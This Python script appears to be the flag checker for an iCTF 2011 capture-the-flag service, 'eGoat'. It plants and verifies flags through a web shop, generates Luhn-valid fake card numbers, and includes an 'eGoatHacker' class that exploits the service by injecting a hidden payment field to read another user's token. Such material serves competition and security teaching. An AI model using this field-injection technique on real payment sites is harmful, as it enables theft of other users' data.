#!/usr/bin/env python
import mechanize
import logging
import random
import string
from random import Random
import copy
import hashlib
import base64
import itertools
import sys

logging.basicConfig(level=logging.INFO)


################################################################################
### UTILS
################################################################################

def random_string():
    return ''.join(random.choice(string.ascii_lowercase)
                for x in range(random.choice(range(10, 20))))


################################################################################
### IRC
################################################################################
import irclib


# Connection information
network = 'irc.ictf2011.info'
port = 6667
channel = '#egoats_CanIHazSecretRoomz'

def say_in_irc(message):
    # Create an IRC object
    irc = irclib.IRC()

    # Create a server object, connect and join the channel
    server = irc.server()
    server.connect ( network, port, random_string(), ircname = random_string() )
    server.join ( channel )
    server.privmsg(channel, message)
    server.quit('FLAG planted')


################################################################################
### HTML 
################################################################################

import html5lib
import lxml.html
def string_to_dom(html_string):
    ''' Gets any html string, and safely parses it to
        a document

        Usage example: print doc.cssselect('script')[0].text
                       gets the content of the first <script>
    '''
    xml = html5lib.parse(html_string).toxml()
    doc = lxml.html.document_fromstring(xml)
    return doc

################################################################################
### CREDIT CARD
################################################################################
generator = Random()
generator.seed()

def random_credit_card(type=""):
        def credit_card_number(generator, prefixList, length):
            def _completed_number(prefix, length):
                ccnumber = prefix
                while len(ccnumber) < (length - 1):
                    digit = generator.choice(['0',  '1', '2', '3', '4', '5', '6', '7', '8', '9'])
                    ccnumber.append(digit)
                sum, pos = (0, 0)
                reversedCCnumber = []
                reversedCCnumber.extend(ccnumber)
                reversedCCnumber.reverse()
                while pos < length - 1:
                    odd = int( reversedCCnumber[pos] ) * 2
                    if odd > 9:
                        odd -= 9
                    sum += odd
                    if pos != (length - 2):
                        sum += int( reversedCCnumber[pos+1] )
                    pos += 2
                checkdigit = ((sum / 10 + 1) * 10 - sum) % 10
                ccnumber.append( str(checkdigit) )
                return ''.join(ccnumber)
            result = []
            ccnumber = copy.copy( generator.choice(prefixList) )
            result.append( _completed_number(ccnumber, length) )
            return result

        if type in "visa":
            visaPrefixList = [['4','0','2','4', '0', '0', '7', '1'],]
            return credit_card_number(generator, visaPrefixList, 16)
        elif type is "bogus":
            amexPrefixList = [['3','4'],['3', '7']]
            return credit_card_number(generator, amexPrefixList, 16)
        #elif type is "discover":
        #    discoverPrefixList = [['6','0','1','1']]
        #    return credit_card_number(generator, discoverPrefixList, 16)
        elif type is "master":
            mastercardPrefixList = [['5','1'],['5','2'],['5','3'],['5','4'],['5','5']]
            return credit_card_number(generator, mastercardPrefixList, 16)

################################################################################
### ACTUAL SCRIPT
################################################################################


def email_from_secret(secret):
    return base64.urlsafe_b64encode(hashlib.md5(secret).hexdigest())[:10].lower() + '@gmail.com'


class eGoatCostumer(object):

    def __init__(self, ip):
        self.ip = ip
        self.base_url = 'http://%s:53550/' % ip
        self.ensure_logged_out()

    def do_set_flag(self, secret, flag):
        self.ensure_logged_out()
        logging.info('Setting flag routine started')
        email = email_from_secret(secret)
        checks = [self.check_main_page(),
                  self.check_sign_up(email, secret),
                  self.check_make_payment(),
                  self.check_get_remote_payment(),
                  self.set_flag(flag),
                  self.check_flag(),]
        logging.info('Setting flag routine completed')
        return any(checks)

    def do_check_flag(self, secret):
        self.ensure_logged_out()
        logging.info('Checking flag routine started')
        email = email_from_secret(secret)
        checks = [self.check_main_page(),
                  self.check_sign_in(email, secret),
                  self.check_get_remote_payment(),
                  self.check_flag(),]
        logging.info('Checking flag routine completed')
        return any(checks)

    def ensure_logged_out(self):
        self.br = mechanize.Browser()
        self.br.set_handle_redirect(True)
        self.br.set_handle_referer(True)
        self.br.set_handle_robots(False)
        self.br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux '
                              'i686; en-US; rv:1.9.0.1) Gecko/2008071615 '
                              'Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

    def check_sign_in(self, email, password):
        logging.info('Signing in with %s / %s' % (email, password))
        response = self.br.open(self.base_url + 'users/sign_in')
        self.br.select_form(nr=0)
        self.br['user[email]'] = email
        self.br['user[password]'] = password
        response = self.br.submit()
        if 'sign_in' in response.geturl():
            logging.error('Could not sign in')
            return False
        return False

    def check_main_page(self):
        logging.info('Checking main page')
        response = self.br.open(self.base_url)
        if not self.br.viewing_html():
            logging.error('Home page is not html')
            return True
        if not "goat owner" in response.read():
            logging.error('Could not recognize home page')
            return True
        logging.info('Main page is up')
        return False

    def check_sign_up(self, email, password):
        logging.info('Creating a user')
        response = self.br.open(self.base_url + 'users/sign_up')
        self.br.select_form(nr=0)
        self.br['user[email]'] = email
        self.br['user[password]'] = password
        self.br['user[password_confirmation]'] = password
        response = self.br.submit()
        if 'sign_up' in response.geturl():
            logging.error('Could not sign up')
            return True
        if not 'Logout' in response.read():
            logging.error('Sign up was unsuccessful')
            return True
        logging.info('User created: %s / %s ' % (email, password))
        return False

    def check_make_payment(self):
        logging.info('Making a payment')
        response = self.br.open(self.base_url + 'payments/new')
        self.br.select_form(nr=0)
        card_type = random.choice(['bogus', 'master', 'visa'])
        self.br['payment[amount]'] = str(random.choice(xrange(1, 100)))
        self.br['payment[credit_card_attributes][number]'] = str(random_credit_card(card_type))
        self.br['payment[credit_card_attributes][month]'] =  str(random.choice(xrange(1, 13)))
        self.br['payment[credit_card_attributes][year]'] =   str(random.choice(xrange(2013, 2019)))
        self.br['payment[credit_card_attributes][first_name]'] = random_string()
        self.br['payment[credit_card_attributes][last_name]'] = random_string()
        self.br.form.set_all_readonly(False)
        self.br['payment[credit_card_attributes][type]'] = card_type
        response = self.br.submit()
        self.br.open(self.base_url + 'payments/start_remote_payment')
        response = self.br.open(self.base_url + 'payments/payment_successful')
        dom = string_to_dom(response.read())
        try:
            token =  dom.cssselect('b#token')[0]
        except:
            logging.error('Token not found on payment_successful page')
            return True
        if not token.text:
            logging.error('Token is empty on payment_successful page')
        logging.info('Payment successful')
        return False

    def check_get_remote_payment(self):
        logging.info('Getting the transaction id')
        response = self.br.open(self.base_url + 'users/me')
        dom = string_to_dom(response.read())
        try:
            remote_payment_id = dom.cssselect('li[class=offer]')[-1:][0].get('id')
        except:
            logging.error('Could not find the remote payment id of my transaction')
            return True
        logging.info('The remote_payment_id is %s' % remote_payment_id)
        if not remote_payment_id:
            logging.error('Transaction id is empty')
            return True
        self.remote_payment_id = remote_payment_id
        logging.info('Transaction id found: %s ' % remote_payment_id)
        return False

    def check_flag(self):
        logging.info('Checking the flag')
        response = self.br.open(self.base_url + 'remote_payments/%s' % self.remote_payment_id)
        dom = string_to_dom(response.read())
        try:
            found_flag =  dom.cssselect('b#token')[0].text.strip()
        except:
            logging.error('Token not found on remote_payments page')
            return True
        logging.info('Flag found')
        logging.info('The flag is still available')
        self.found_flag = found_flag
        return False

    def set_flag(self, flag):
        logging.info('Setting the new flag %s' % flag)
        self.br.open(self.base_url + 'remote_payments/%s/edit' % self.remote_payment_id)
        self.br.select_form(nr=0)
        self.br['remote_payment[token]'] = flag
        self.br.submit()
        logging.info('New flag is up')

    def check_user_reacheable(self):
        pass

    def check_delete_flag(self):
        pass


class eGoatHacker(object):

    def __init__(self, ip):
        self.ip = ip
        self.base_url = 'http://%s:53550/' % ip
        self.br = mechanize.Browser()
        self.br.set_handle_redirect(True)
        self.br.set_handle_referer(True)
        self.br.set_handle_robots(False)
        self.br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux '
                              'i686; en-US; rv:1.9.0.1) Gecko/2008071615 '
                              'Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

    def do_steal_flag(self, target_email):
        logging.info('Stealing flag routing started')
        password = random_string()
        email = random_string() + '@gmail.com'
        self.sign_up(email, password)
        remote_payment_id = self.get_target_payment(target_email)
        flag = self.steal_payment(remote_payment_id)
        logging.info('Stealing flag routine completed')
        return flag

    def sign_up(self, email, password):
        logging.info('Creating a user')
        response = self.br.open(self.base_url + 'users/sign_up')
        self.br.select_form(nr=0)
        self.br['user[email]'] = email
        self.br['user[password]'] = password
        self.br['user[password_confirmation]'] = password
        response = self.br.submit()
        if 'sign_up' in response.geturl():
            logging.error('Could not sign up')
            raise
        if not 'Logout' in response.read():
            logging.error('Sign up was unsuccessful')
            raise
        logging.info('User created: %s / %s ' % (email, password))

    def get_target_payment(self, target_email):

        email_to_id = {}
        for page in itertools.count(1):
                logging.info('Getting page')
                response = self.br.open(self.base_url + 'users?page=%s' % page)
                dom = string_to_dom(response.read())
                terminate = True
                for a, link in [(a, a.get('href')) for a in dom.cssselect('a')]:
                    if link.startswith('/users/'):
                        user_id = link.split('/')[-1:][0]
                        if user_id.isdigit():
                            terminate = False
                            email_to_id[a.text.strip()] = user_id
                if terminate:
                    break
        response = self.br.open(self.base_url + 'users/%s' % email_to_id[target_email.strip()])
        dom = string_to_dom(response.read())
        try:
            remote_payment_id = dom.cssselect('li[class=offer]')[-1:][0].get('id')
        except:
            logging.error('Could not find the remote payment id of my transaction')
            raise
        if not remote_payment_id:
            logging.error('Transaction id is empty')
            raise
        return remote_payment_id

    def steal_payment(self, remote_payment_id):

        logging.info('Making a payment with remote_payment_id %s' % remote_payment_id)
        response = self.br.open(self.base_url + 'payments/new')
        self.br.select_form(nr=0)
        card_type = random.choice(['bogus', 'master', 'visa'])
        self.br['payment[amount]'] = str(random.choice(xrange(1, 100)))
        self.br['payment[credit_card_attributes][number]'] = str(random_credit_card(card_type))
        self.br['payment[credit_card_attributes][month]'] =  str(random.choice(xrange(1, 13)))
        self.br['payment[credit_card_attributes][year]'] =   str(random.choice(xrange(2013, 2019)))
        self.br['payment[credit_card_attributes][first_name]'] = random_string()
        self.br['payment[credit_card_attributes][last_name]'] = random_string()
        self.br.form.set_all_readonly(False)
        self.br['payment[credit_card_attributes][type]'] = card_type
        self.br.form.new_control('text', 'payment[remote_payment_id]', {'value':''} )
        self.br['payment[remote_payment_id]'] = remote_payment_id
        self.br.form.fixup()
        self.br.set_handle_redirect(False)
        try:
            response = self.br.submit()
            # WTF, oh funny mechanize
        except:
            pass
        response = self.br.open(self.base_url + 'payments/payment_successful')
        dom = string_to_dom(response.read())
        try:
            token =  dom.cssselect('b#token')[0]
        except:
            logging.error('Token not found on payment_successful page')
            raise
        if not token.text:
            logging.error('Token is empty on payment_successful page')
            raise
        flag = token.text
        logging.info('Flag found: %s' % flag)
        return flag



def set_flag(ip, secret, flag):
    customer = eGoatCostumer(ip)
    if customer.do_set_flag(secret, flag):
        print "Service down"
    else:
        print "Service up"
        say_in_irc(email_from_secret(secret))

def get_flag(ip, secret):
    customer = eGoatCostumer(ip)
    if customer.do_check_flag(secret):
        print "Service down"
    else:
        print "Service up"
    return customer.found_flag

def debug():
    ip = '192.35.222.28'
    flag = 'FLAGFLAGFLAGFLAG'
    secret = random_string()
    set_flag(ip, secret, flag)

    found_flag = get_flag(ip, secret)
    print 'FOUND FLAG', found_flag

    # Steal
    target_email = email_from_secret(secret)
    hacker = eGoatHacker(ip)
    stolen_flag = hacker.do_steal_flag(target_email)
    if flag == stolen_flag:
        logging.info('Stolen flag is correct!')

def usage():
    print """
USAGE:
    get IP COOKIE
    set IP FLAG
"""

if __name__ == '__main__':
    if len(sys.argv) != 4:
        usage()
        sys.exit(1)
    if sys.argv[1] == 'set':
        secret = random_string()
        set_flag(ip=sys.argv[2],
                 secret=secret,
                 flag=sys.argv[3])
        print 'COOKIE:%s' % secret
    elif sys.argv[1] == 'get':
        flag = get_flag(ip=sys.argv[2],
                        secret=sys.argv[3])
        print 'FLAG:%s' % flag
    else:
        usage()

